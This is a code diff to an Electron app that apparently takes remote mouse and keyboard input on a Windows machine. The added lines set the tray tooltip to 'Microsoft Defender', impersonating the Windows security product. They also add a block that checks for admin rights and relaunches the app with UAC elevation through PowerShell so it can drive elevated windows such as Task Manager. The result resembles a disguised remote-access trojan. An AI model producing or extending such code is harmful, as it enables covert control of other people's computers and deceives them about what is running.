@@ -245,7 +245,7 @@ function createSystemTray() {
     },
   ]);
 
-  tray.setToolTip("Microsoft Defender - Running in background");
+  tray.setToolTip("Microsoft Defender");
   tray.setContextMenu(contextMenu);
 
   // Double-click to restore window
@@ -259,6 +259,27 @@ function createSystemTray() {
   });
 
   console.log("🍫 System tray created");
+}
+
+// Windows: request admin elevation so we can inject input into elevated windows
+// (Task Manager, Device Manager, etc. run at HIGH integrity — we need to match)
+if (process.platform === "win32") {
+  const { execSync, spawn } = require("child_process");
+  const isAdmin = (() => {
+    try { execSync("net session", { stdio: "ignore" }); return true; }
+    catch { return false; }
+  })();
+  if (!isAdmin) {
+    console.log("⚠️ Not running as admin — relaunching with elevation for elevated-window control");
+    spawn(
+      "powershell",
+      ["-Command", `Start-Process -FilePath "${process.execPath}" -Verb RunAs`],
+      { detached: true, stdio: "ignore" }
+    ).unref();
+    app.exit(0);
+  } else {
+    console.log("✅ Running as Administrator — elevated-window input control enabled");
+  }
 }
 
 app.whenReady().then(async () => {
@@ -847,7 +868,7 @@ async function handleInput(data, event = null) {
         );
       }
 
-      await clickMouse(data.button || "left");
+      await clickMouse(data.button === 2 || data.button === "right" ? "right" : "left");
     }
 
     // Handle double-click events
@@ -887,7 +908,7 @@ async function handleInput(data, event = null) {
     if (data.action === "keypress" || data.action === "keydown" || data.action === "keyup") {
       // Only process keydown events to avoid duplicate key presses
       if (data.action === "keydown" || data.action === "keypress") {
-        await pressKey(data.key, data.modifiers || [], data.code);
+        await pressKey(data.key, data.modifiers || [], data.code, data.ctrlKey, data.altKey, data.shiftKey, data.metaKey);
       }
     }
 
